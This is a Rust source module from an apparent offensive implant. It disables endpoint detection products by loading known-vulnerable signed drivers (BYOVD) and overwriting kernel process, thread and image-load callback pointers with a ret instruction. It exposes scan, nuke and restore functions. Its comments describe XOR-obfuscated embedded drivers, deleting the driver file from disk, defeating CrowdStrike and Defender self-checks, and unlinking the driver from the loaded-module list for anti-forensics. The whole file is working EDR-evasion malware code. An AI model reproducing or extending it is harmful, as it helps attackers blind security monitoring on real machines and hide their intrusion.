//! Kernel callback overwrite module (BYOVD — Bring Your Own Vulnerable Driver).
//!
//! This module surgically overwrites EDR kernel callback function pointers to
//! point to a `ret` instruction instead of NULLing them. This defeats EDR
//! self-integrity checks (CrowdStrike, Microsoft Defender for Endpoint) that
//! verify their callbacks are still registered by checking if the pointer is
//! non-NULL. A ret pointer passes these checks (non-NULL, valid executable
//! memory) but causes the callback to immediately return without executing
//! any monitoring logic.
//!
//! # Architecture
//!
//! The module is divided into four sub-modules:
//!
//! - **`driver_db`**: Static database of 8 known vulnerable signed drivers
//!   (Dell, ASUS, Baidu, ENE, Gigabyte, Process Explorer, MSI Afterburner,
//!   WinRing0). Top 3 are embedded (XOR-obfuscated) in the agent binary.
//!
//! - **`deploy`**: Driver deployment — scans for pre-loaded drivers, drops
//!   embedded drivers to disk (obfuscated filename), loads via NtLoadDriver,
//!   deletes file from disk. Obtains device handles for IOCTL communication.
//!
//! - **`discover`**: Callback discovery — reads kernel memory to locate and
//!   enumerate EDR callbacks in PspCreateProcessNotifyRoutine,
//!   PspCreateThreadNotifyRoutine, PspLoadImageNotifyRoutine,
//!   CallbackListHead, and KeBugCheckCallbackListHead.
//!
//! - **`overwrite`**: Surgical overwrite — finds a `ret` instruction in
//!   ntoskrnl.exe, overwrites each EDR callback's function pointer to point
//!   to ret, saves backups for restore, and unlinks the vulnerable driver
//!   from PsLoadedModuleList.
//!
//! # Safety
//!
//! - KeBugCheckCallbackListHead entries are **never** overwritten (BSOD risk)
//! - Original pointers are saved for `KernelCallbackRestore`
//! - Failed physical memory writes are skipped (no garbage writes)
//! - Driver is unlinked from PsLoadedModuleList after overwrite
//!
//! # NT API Usage
//!
//! All NT API calls go through `syscall!`.
//! All strings through `string_crypt`.

pub mod driver_db;
pub mod deploy;
pub mod discover;
pub mod overwrite;

use anyhow::{Context, Result};
use common::CryptoSession;

/// Perform a kernel callback scan: discover all registered EDR callbacks.
///
/// # Returns
/// JSON-serialized scan result on success.
pub fn scan(session_key: &[u8]) -> Result<String> {
    // Step 1: Find or deploy a vulnerable driver.
    let deployed = deploy::deploy(&[], session_key)
        .context("failed to deploy vulnerable driver for scan")?;

    // Step 2: Scan for callbacks.
    let result = discover::scan_callbacks(&deployed)
        .context("callback scan failed")?;

    // Serialize to JSON.
    let json = serde_json::to_string_pretty(&result)
        .unwrap_or_else(|_| format!("{{\"error\": \"serialization failed\", \"total_count\": {}}}", result.total_count));

    // If we freshly deployed the driver, clean it up after scan-only.
    if !deployed.was_preloaded {
        unsafe {
            let _ = deploy::cleanup_driver();
        }
    }

    Ok(json)
}

/// Perform a kernel callback nuke: overwrite EDR callbacks with ret.
///
/// # Arguments
/// * `preferred_drivers` - Optional list of driver names to try (empty = all)
/// * `session_key` - HKDF session key for driver resource decryption
///
/// # Returns
/// JSON-serialized nuke result on success.
pub fn nuke(preferred_drivers: &[String], session_key: &[u8]) -> Result<String> {
    // Step 1: Find or deploy a vulnerable driver.
    let deployed = deploy::deploy(preferred_drivers, session_key)
        .context("failed to deploy vulnerable driver for nuke")?;

    // Step 2: Perform the overwrite.
    let result = overwrite::nuke_callbacks(&deployed)
        .context("callback nuke failed")?;

    // Serialize to JSON.
    let json = serde_json::to_string_pretty(&result)
        .unwrap_or_else(|_| "{\"error\": \"serialization failed\"}".to_string());

    // Note: We do NOT clean up the driver here. The driver stays loaded
    // for the restore operation. The overwrite module already unlinks it
    // from PsLoadedModuleList for anti-forensic purposes.

    Ok(json)
}

/// Restore all previously overwritten kernel callback pointers.
///
/// # Returns
/// JSON-serialized restore result on success.
pub fn restore(session_key: &[u8]) -> Result<String> {
    // Check if we have backups to restore.
    if !overwrite::has_backups() {
        return Err(anyhow::anyhow!(
            "no callback backups available for restore (no prior KernelCallbackNuke in this session)"
        ));
    }

    // We need the deployed driver for physical memory write access.
    // Try to get the currently deployed one, or deploy a new one.
    let deployed = match deploy::get_deployed_driver() {
        Some(d) => d,
        None => {
            deploy::deploy(&[], session_key)
                .context("failed to deploy vulnerable driver for restore")?
        }
    };

    // Restore the callbacks.
    let result = overwrite::restore_callbacks(&deployed)
        .context("callback restore failed")?;

    // Now clean up the driver deployment.
    unsafe {
        let _ = deploy::cleanup_driver();
    }

    let json = serde_json::to_string_pretty(&result)
        .unwrap_or_else(|_| "{\"error\": \"serialization failed\"}".to_string());

    Ok(json)
}

/// Get a status summary of the kernel callback subsystem.
///
/// Returns JSON with: backup count, deployed driver status, etc.
pub fn status() -> String {
    let backup_count = overwrite::get_backup_snapshot().len();
    let deployed = deploy::get_deployed_driver();

    let status = serde_json::json!({
        "backups_available": backup_count,
        "driver_deployed": deployed.is_some(),
        "driver_name": deployed.as_ref().map(|d| d.driver.name).unwrap_or("none"),
        "driver_preloaded": deployed.as_ref().map(|d| d.was_preloaded).unwrap_or(false),
    });

    serde_json::to_string_pretty(&status).unwrap_or_default()
}
